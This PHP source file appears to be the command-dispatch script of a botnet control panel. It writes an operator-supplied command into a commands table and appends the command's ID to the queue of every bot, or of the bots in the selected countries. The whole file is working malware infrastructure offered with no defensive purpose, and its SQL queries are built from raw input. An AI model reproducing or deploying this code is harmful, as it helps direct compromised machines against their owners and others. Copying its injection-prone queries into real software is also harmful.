<?php
    include('auth.php');
    include("./inc/config.php");
    include("./inc/funcs.php");
    if (isset($_POST["addCommand"]) && isset($_POST["addParameters"]) && isset($_POST["addMax"]) && isset($_POST["addCountries"]))
    {
        if(is_numeric(dRead("addMax")))
        {
            $numMax = dRead("addMax");
        }
        else
        {
            $numMax = "0";
        }
        
        $sql = "INSERT INTO `lst_commands` (`ID`, `command`, `parameters`, `max`,`done`) VALUES (NULL, '".dRead("addCommand")."', '".dRead("addParameters")."', '".$numMax."', '0');";
        $res = mysql_query($sql);
        $comID = mysql_insert_id();
        
        $lstCountries = dRead("addCountries");
        $arrCountries = explode(", ", $lstCountries);
        if(count($arrCountries) > 0)
        {
            for($p=0;$p<count($arrCountries);$p++)
            {
                if($arrCountries[$p] == "All Countries")
                {
                    $sql = "SELECT * FROM `lst_bots` WHERE 1;";  
                }
                else
                {
                    $sql = "SELECT * FROM `lst_bots` WHERE `country` = '".$arrCountries[$p]."';"; 
                }
                $res = mysql_query($sql);
                if (mysql_num_rows($res) > 0)
                {
                    for($i=0;$i<mysql_num_rows($res);$i++)
                    {
                        $data = mysql_fetch_array($res);
                        $cmdData = $data['commands'];
                        $cmdData = $cmdData."[".$comID."]#";
                        $sql = "UPDATE `lst_bots` SET `commands` = '".$cmdData."' WHERE `UID` = '".$data['UID']."';";
                        mysql_query($sql);
                    }
                }
            }  
                       
     }
     echo '{success:true}';
     die(""); 
}
    echo '{success:false}';
    die("");
?>